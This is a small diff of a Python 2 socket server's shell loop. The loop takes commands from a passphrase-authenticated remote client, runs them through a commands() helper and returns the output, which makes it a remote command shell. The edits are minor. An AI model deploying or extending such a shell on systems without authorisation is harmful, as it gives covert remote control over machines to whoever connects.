@@ -33,21 +33,20 @@ def commands(command):
 #main server functions, command parsing
 def shell(clientSocket):
     while True:
-        clientSocket.send("\nECHI> ^-^")
+        clientSocket.send("\n^-^")
         buffer = ""
         while "\n" not in buffer:
-            buffer += clientSocket.recv(1024)
-        if buffer == 'quit'.rstrip():
+            buffer += clientSocket.recv(4096)
+        if buffer == 'quit':
             clientSocket.send("[*] Terminating Connection. Goodbye.")
             clientSocket.close()
             break
         elif buffer == "\n":
+            print ""
             continue
         else:
             output = commands(buffer)
             clientSocket.send(output)
-
-
 
 #Client Handler, require predetermined hash/passphrase to establish connection
 def handleClient(clientSocket):
